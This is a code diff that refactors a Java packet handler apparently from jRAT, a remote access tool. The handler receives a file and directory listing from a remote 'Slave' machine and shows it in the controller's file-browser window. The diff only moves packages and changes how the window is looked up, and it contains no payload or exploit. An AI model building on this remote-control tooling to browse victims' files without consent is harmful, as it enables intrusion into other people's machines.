@@ -1,9 +1,10 @@
-package jrat.controller.packets.incoming;
+package jrat.module.fs.packets;
 
 import iconlib.FileIconUtils;
 import jrat.controller.Slave;
 import jrat.controller.io.FileObject;
-import jrat.controller.ui.frames.FrameRemoteFiles;
+import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.module.fs.ui.FrameRemoteFiles;
 
 import java.io.DataInputStream;
 import java.util.ArrayList;
@@ -14,7 +15,6 @@ public class Packet22ListFiles extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		FrameRemoteFiles fr = FrameRemoteFiles.INSTANCES.get(slave);
 		List<FileObject> files = new ArrayList<FileObject>();
 		List<FileObject> dirs = new ArrayList<FileObject>();
 
@@ -43,18 +43,17 @@ public class Packet22ListFiles extends AbstractIncomingPacket {
 			}
 		}
 
-		if (fr != null) {
-			fr.getFilesPanel().getRemoteTable().clear();
+        FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
+		if (frame != null) {
+			frame.getFilesPanel().getRemoteTable().clear();
 
 			for (FileObject fo : dirs) {
-				fr.getFilesPanel().getRemoteTable().addFileObject(fo);
+				frame.getFilesPanel().getRemoteTable().addFileObject(fo);
 			}
 			
 			for (FileObject fo : files) {
-				fr.getFilesPanel().getRemoteTable().addFileObject(fo);
+				frame.getFilesPanel().getRemoteTable().addFileObject(fo);
 			}
 		}
-
 	}
-
 }
